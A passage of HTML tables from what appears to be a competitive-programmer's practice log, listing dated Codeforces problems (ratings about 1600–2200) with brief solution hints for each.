href="https://codeforces.com/problemset/problem/922/D">CF922D</a></td><td>Think of the order of $2$ first.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/500/D">CF500D</a></td><td>When you think about the sum &#x2F; expectation of something, you can break it into parts and calculate their contribution.</td></tr></tbody></table><p>04.24</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/765/D">CF765D</a></td><td>The problem is about a graph.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/749/D">CF749D</a></td><td>What happens before the price is settled.</td></tr></tbody></table><p>04.25</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1114/C">CF1114C</a></td><td>The number of trailing zero digits in the $b$-ary representation means the largest $k$ such that $b^k|x$ .</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/526/C">CF526C</a></td><td>Consider the expensive one. How can you replace it?</td></tr></tbody></table><p>04.26</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1029/C">CF1029C</a></td><td>It’s always easier to consider the intersection when you add a segment instead of deleting it.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/1525/E">CF1525E</a></td><td>The conditions for an unlit city is much simpler.</td></tr></tbody></table><p>04.27</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/573/B">CF573B</a></td><td>Consider each vertical line. How can it be fully destroyed? Only a few ways.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/567/E">CF567E</a></td><td>To what extent should an edge be reduced to be on the shortest path? How can you judge an edge is “definitely included in the shortest path”?</td></tr></tbody></table><p>04.29</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1267/J">CF1267J</a></td><td>We only cares about the frequency of each number. And the answer will not exceed the minimum of it.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1270/D">CF1270D</a></td><td>You don’t need $n$ elements.</td></tr></tbody></table><p>04.30</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/747/D">CF747D</a></td><td>Use winter tires: (i) on cold days; (ii) to reduce the number of changing.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1817/B">CF1817B</a></td><td>Find the special vertice.</td></tr></tbody></table><h3 id="05月"><a href="#05月" class="headerlink" title="05月"></a>05月</h3><p>05.01</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/631/C">CF631C</a></td><td>Some operations are just useless. If one interval is covered by a larger interval afterwards, what will happen?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/386/C">CF386C</a></td><td>Think of the strings which end at position $i$. Different starting positions cause the different diversities.</td></tr></tbody></table><p>05.02</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1168/A">CF1168A</a></td><td>If we apply $x$ operations, we can change each element $0,1,\dots,x$ times.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/954/E">CF954E</a></td><td>If we have both “hot” water and “cold” water unused, it is always possible to make some more “warm” water.</td></tr></tbody></table><p>05.03</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1163/B2">CF1163B2</a></td><td>Consider the different cases where conditions are met.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/1146/D">CF1146D</a></td><td>The problem is the same as finding the minimum $x$ for $y$ such that if the interval contains $x$, $y$ can be reached</td></tr></tbody></table><p>05.04</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1175/C">CF1175C</a></td><td>If we have only $k+1$ points, how can we minimize the function $f_k(x)$ ?</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/1575/L">CF1575L</a></td><td>If in the end $i,j\ (i\lt j)$ satisfies $f(i)&#x3D;i,f(j)&#x3D;j$ , what are the conditions their origin positions should meet?</td></tr></tbody></table><p>05.06</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/989/C">CF989C</a></td><td>Try increasing the occurence of one color while not changing the others’. What if the areas of the others are “large enough”?</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1569/D">CF1569D</a></td><td>What conditions should the points in one pair satisfy? Consider one of the conditions first and then process the other.</td></tr></tbody></table><p>05.07</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1129/A2">CF1129A2</a></td><td>When you get to a point, you can update your minimum time to deliver all the candies.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1644/E">CF1644E</a></td><td>When you’ve done operations of both <code>D</code> and <code>R</code>, you can go wherever you want (right or down) as long as you don’t exceed the boundaries afterwards.</td></tr></tbody></table><p>05.08</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1102/E">CF1102E</a></td><td>Where shouldn’t ${b_i}$ change?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/721/D">CF721D</a></td><td>First, check if the result can be negative. Then use your greedy approach.</td></tr></tbody></table><p>05.09</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1019/A">CF1019A</a></td><td>Your votes should be strictly more than any other party’s. You can fix one variable first.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/720/A">CF720A</a></td><td>With greater ability comes greater responsibility.</td></tr></tbody></table><p>05.10</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1609/D">CF1609D</a></td><td>If you have a connected component, you can re-arrange the edges in it.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/859/D">CF859D</a></td><td>You only care about what are the odds of person $i$ still winning in the $k$-th round instead of the whole process.</td></tr></tbody></table><p>05.11</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1028/C">CF1028C</a></td><td>First of all, figure out the conditions of rectangles having a common point. Then you need to calculate whether the conditions are satisfied when deleting one rectangle.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/852/F">CF852F</a></td><td>Use Logarithm.</td></tr></tbody></table><p>05.13</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/799/C">CF799C</a></td><td>Just check every possible type combinations of the fountains.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1029/D">CF1029D</a></td><td>Use math expression to represent the concatenation of $2$ numbers.</td></tr></tbody></table><p>05.14</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/914/C">CF914C</a></td><td>The number can decline really quickly. And you only cares about the number of $1$s in the original number.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/965/D">CF965D</a></td><td>Brain teaser. If a frog can only jump $l$ units at most, it should “rest” on some segments.</td></tr></tbody></table><p>05.15</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/954/C">CF954C</a></td><td>What can be the difference between two neighboring positions?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/490/E">CF490E</a></td><td>When filling in the blanks from the first number to the last, you should always write the smallest number possible.</td></tr></tbody></table><p>05.16</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/960/C">CF960C</a></td><td>How can you produce an array such that each subsequence of it satisfy the conditions? Base your solution on this.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1219/G">CF1219G</a></td><td>When there are both vertical and horizontal lines to consider, you can enumerate one dimension and use greedy approach on the other.</td></tr></tbody></table><p>05.17</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1025/C">CF1025C</a></td><td>What does the operation actually mean? Find a position to split and connect the strings on the other side.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/909/D">CF909D</a></td><td>If we can finish each deletion of one character in $\mathcal{O}(1)$ time, we will be able to solve the problem.</td></tr></tbody></table><p>05.18</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1056/D">CF1056D</a></td><td>Smaller subtrees mean easier constraints</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/1575/H">CF1575H</a></td><td>When it comes to DP problems, you need to carefully choose your status.</td></tr></tbody></table><p>05.20</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/917/A">CF917A</a></td><td>When given a string, find the conditions it should satisfy to be “pretty”.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/335/B">CF335B</a></td><td>If you find the longest palindrome subsequence, you call always get the answer. But if it is longer than $100$, you can output a string of length $100$.</td></tr></tbody></table><p>05.21</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/533/E">CF533E</a></td><td>There are a lot of things in common for $S$ and $T$, such as their prefixes and suffixes.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/420/C">CF420C</a></td><td>Find a way to calculate the $p’$ (number of conditions satisfied) for one pair quickly.</td></tr></tbody></table><p>05.22</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1132/C">CF1132C</a></td><td>How does the painted section change when you “delete” $2$ painters?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/314/C">CF314C</a></td><td>The question is similar to finding the longest increasing subsequence. How can you change the code to solve this?</td></tr></tbody></table><p>05.23</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/900/C">CF900C</a></td><td>What conditions should an element satisfy if it stays in the final result? What’s the contribution of deleting one element?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/501/D">CF501D</a></td><td>You need to do $2$ things: find the order of one permutation; find the $k$-th permutation.</td></tr></tbody></table><p>05.24</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1095/D">CF1095D</a></td><td>If you decide one edge, the whole circle should be fully determined.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/301/B">CF301B</a></td><td>Just find the shortest path. Note that $a_i\leq 10^3\leq d$ .</td></tr></tbody></table><p>05.25</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/962/D">CF962D</a></td><td>Just implement it. Find a quick way to decide the deleted element.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/894/E">CF894E</a></td><td>In a strongly-connected component, you can go wherever you want.</td></tr></tbody></table><p>05.27</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1954/D">CF1954D</a></td><td>If we know the number of balls of each color, what should be the minimum number of groups? How is it determined?</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/835/D">CF835D</a></td><td>Classic DP because one $k$-palindrome consists of two $k-1$-palindromes. You can use the result of the smaller substrings to decide the answer of the larger strings.</td></tr></tbody></table><p>05.28</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/869/C">CF869C</a></td><td>Find the necessary conditions first and then prove it is sufficient.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1168/B">CF1168B</a></td><td>The condition is hard to satisfy as there are $\mathcal{O}(k^2)$ triples. It means something.</td></tr></tbody></table><p>05.29</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1148/C">CF1148C</a></td><td>Find a way to swap $2$ elements.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/609/D">CF609D</a></td><td>You can wait until “the last moment” to decide when to exchange your burles and how you should buy items.</td></tr></tbody></table><p>05.30</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1217/C">CF1217C</a></td><td>Note that the value of $f(l,r)$ shouldn’t be too large.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1083/B">CF1083B</a></td><td>Consider prefixes of each length, how many times can they appear?</td></tr></tbody></table><p>05.31</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1671/D">CF1671D</a></td><td>Use the fact that you can insert any number between two consecutive numbers in the array without changing the score.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/960/D">CF960D</a></td><td>Note that the total depth isn’t large. And each number in the same layer is always changed together.</td></tr></tbody></table><h3 id="06月"><a href="#06月" class="headerlink" title="06月"></a>06月</h3><p>06.01</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1498/C">CF1498C</a></td><td>Which particles can be considered together? Use the conditions as the DP status.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/802/K">CF802K</a></td><td>When considering a subtree, there are two possible situations: you return to the root to get to the other subtrees; you never return.</td></tr></tbody></table><p>06.03</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/802/B">CF802B</a></td><td>When you have to “delete” one book in the library, which one should you choose? It should be not needed soon.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/862/C">CF862C</a></td><td>Note that the freedom of choosing the numbers is quite large. You can fix many integers as the numbers in the result first.</td></tr></tbody></table><p>06.04</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1949/I">CF1949I</a></td><td>Consider two neighboring circles. If the radii of one circle change, how should the other change?</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1133/F2">CF1133F2</a></td><td>Find the minimum and the maximum degree of node $1$.</td></tr></tbody></table><p>06.05</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1579/E2">CF1579E2</a></td><td>Each element can be considered separately.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1209/G1">CF1209G1</a></td><td>This problem is actually about segments.</td></tr></tbody></table><p>06.06</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1561/D1">CF1561D1</a></td><td>Consider two kinds of shifts separately. The second one has only a few possible destinations in one shift.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1619/G">CF1619G</a></td><td>If one bomb can trigger another, it is also possible vice versa. So it’s all about a connected component.</td></tr></tbody></table><p>06.07</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1461/D">CF1461D</a></td><td>Find the separation point quickly. And it can be proven that there are not many possible subarray-sums.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/551/D">CF551D</a></td><td>Consider each digit separately.</td></tr></tbody></table><p>06.08</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1056/B">CF1056B</a></td><td>$m$ isn’t large, so the conditons of $(i, j)$ modulo $m$ isn’t large.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/1575/K">CF1575K</a></td><td>Fill in the blanks without constraint first. What about the others?</td></tr></tbody></table><p>06.10</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1286/B">CF1286B</a></td><td>When you have the result of the subtrees, you can always find a suitable value for the root.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/524/C">CF524C</a></td><td>It’s a typical two-sum problem.</td></tr></tbody></table><p>06.11</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/725/D">CF725D</a></td><td>We should send away those who are stronger than us with the minimum cost.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/893/D">CF893D</a></td><td>You can keep your options open when processing the events. That is to say, you can save all the choices you have and delete some of them based on future events.</td></tr></tbody></table><p>06.12</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1153/C">CF1153C</a></td><td>Find the “best” way to construct a correct parenthesis.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/666/B">CF666B</a></td><td>After pre-processing the distance between vertices, you should find a way to enumerate $a\to b\to c\to d$.</td></tr></tbody></table><p>06.13</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1292/B">CF1292B</a></td><td>We only have a few points that are for us to consider. Suppose we arrive at $P_i$ first.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/958/C2">CF958C2</a></td><td>Consider a DP, but you don’t have to know where the last segment ends.</td></tr></tbody></table><p>06.14</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1615/C">CF1615C</a></td><td>Observe what the array can be after $1$ or $2$ operations.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/992/D">CF992D</a></td><td>You can’t multiply by a number other than $1$ many times.</td></tr></tbody></table><p>06.15</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1282/B2">CF1282B2</a></td><td>Suppose you need to buy $m$ goods. First, decide which goods to buy; second, find the minimum cost to buy them.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/811/D">CF811D</a></td><td>Find the perfect place to test.</td></tr></tbody></table><p>06.17</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1249/D2">CF1249D2</a></td><td>Find the leftmost point which doesn’s satisfy the condition. Which segments should you delete?</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/535/D">CF535D</a></td><td>First, decide if the conditions contradict. Then, fill up the residual blanks.</td></tr></tbody></table><p>06.18</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/33/B">CF33B</a></td><td>Consider each position separately.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/819/B">CF819B</a></td><td>Consider each element and the contribution it makes to the result separately.</td></tr></tbody></table><p>06.19</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1051/D">CF1051D</a></td><td>DP is all about designing status and find the transitions.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/317/B">CF317B</a></td><td>The key point is that there are not too many ants. So if they are scattered on the plane, they should not go to far from the $(0, 0)$ .</td></tr></tbody></table><p>06.20</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/678/D">CF678D</a></td><td>You can derive the math function of the final result, but you can also use the matrix transition to represent the whole process.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/131/F">CF131F</a></td><td>First, use a note to record where are the stars. Then, if the upper bound and lower bound of the rectangle is chosen, the problem is a classic two-pointer one.</td></tr></tbody></table><p>06.21</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1151/D">CF1151D</a></td><td>The only variable for each element is actually $j$.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/242/D">CF242D</a></td><td>During the operations, there can only be one period when the condition of one counter is not met.</td></tr></tbody></table><p>06.22</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1033/C">CF1033C</a></td><td>Classic DP for games.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/1468/A">CF1468A</a></td><td>You only need to consider those “important” positions.</td></tr></tbody></table><p>06.24</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/336/C">CF336C</a></td><td>Consider each possible $v$ from large to small.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/535/C">CF535C</a></td><td>If you have multiple conditions to satisfy and the result is “monotone” when checking, you should consider binary search.</td></tr></tbody></table><p>06.25</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/863/C">CF863C</a></td><td>What if the $2$ robots choose the same actions as the did once before?</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1032/D">CF1032D</a></td><td>If you want to get to the line, you should go straight to it.</td></tr></tbody></table><p>06.26</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/833/A">CF833A</a></td><td>Consider each prime factor separately.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1009/E">CF1009E</a></td><td>Consider the contribution of each $a_i$ .</td></tr></tbody></table><p>06.27</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1085/D">CF1085D</a></td><td>Push the weights to other edges.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/366/D">CF366D</a></td><td>Note that the data range isn’t that wide. You can fix the lower bound to find the upper bound.</td></tr></tbody></table><p>06.28</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1321/C">CF1321C</a></td><td>Some characters should be removed earlier.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/74/C">CF74C</a></td><td>Remember the time when you learned about the mirror.</td></tr></tbody></table><p>06.29</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1196/D2">CF1196D2</a></td><td>There are only $3$ different patterns.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/804/C">CF804C</a></td><td>Think of one solution first, and then prove it.</td></tr></tbody></table><h3 id="07月"><a href="#07月" class="headerlink" title="07月"></a>07月</h3><p>07.01</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1833/G">CF1833G</a></td><td>Consider the points from the leaves to the root.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/476/D">CF476D</a></td><td>You can divide each number by $k$ first. Then, note that you can’t have $2$ even numbers in a set.</td></tr></tbody></table><p>07.02</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1442/B">CF1442B</a></td><td>It is about choosing the numbers to delete.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/999/D">CF999D</a></td><td>$\bmod m$ first, then the problem is transition from $i$ to $(i+1)\bmod m$ .</td></tr></tbody></table><p>07.03</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/739/A">CF739A</a></td><td>Find the answer first, and then construct the corresponding array.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/522/D">CF522D</a></td><td>You can process the queries offline. If the left bound is fixed, how can you solve it?</td></tr></tbody></table><p>07.04</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1672/D">CF1672D</a></td><td>The operation is only about moving one element.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/899/E">CF899E</a></td><td>Find the data structure you need to implement the whole process.</td></tr></tbody></table><p>07.05</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/570/C">CF570C</a></td><td>If we only have one segment consisting of <code>&#39;.&#39;</code>, what will the answer be?</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/103/D">CF103D</a></td><td>We don’t have data structures for strange sum like this. But if the $k$ is large, the number of numbers to add are not large.</td></tr></tbody></table><p>07.06</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/231/C">CF231C</a></td><td>If you want to make all elements in a subsequence equal, how many operations at least should you apply?</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/1023/E">CF1023E</a></td><td>$(n-1)+(n-1)&#x3D;2(n-1)$, so the answer should consist of $2$ parts.</td></tr></tbody></table><p>07.08</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1195/D2">CF1195D2</a></td><td>If the positions of the digits of the number are fixed, the contribution of this number is determined. And the positions are only determined by the number of digits of $x,y$ .</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1585/D">CF1585D</a></td><td>The operation is just swapping twice. It is something.</td></tr></tbody></table><p>07.09</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1138/B">CF1138B</a></td><td>Transform the equality to fix one side of it.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/111/B">CF111B</a></td><td>Consider each factor of $x_i$, and you only need to know if it occurs in $x_{i-y_i},\dots,x_{i-1}$ .</td></tr></tbody></table><p>07.10</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/489/D">CF489D</a></td><td>Counting a pattern in a graph: find the special part.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1060/E">CF1060E</a></td><td>How will the distance between $u$ and $v$ change?</td></tr></tbody></table><p>07.11</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1131/F">CF1131F</a></td><td>It is actually about merging the two consecutive parts.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/611/D">CF611D</a></td><td>Classic DP. When you decide which number to choose next, what information should you know?</td></tr></tbody></table><p>07.12</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a 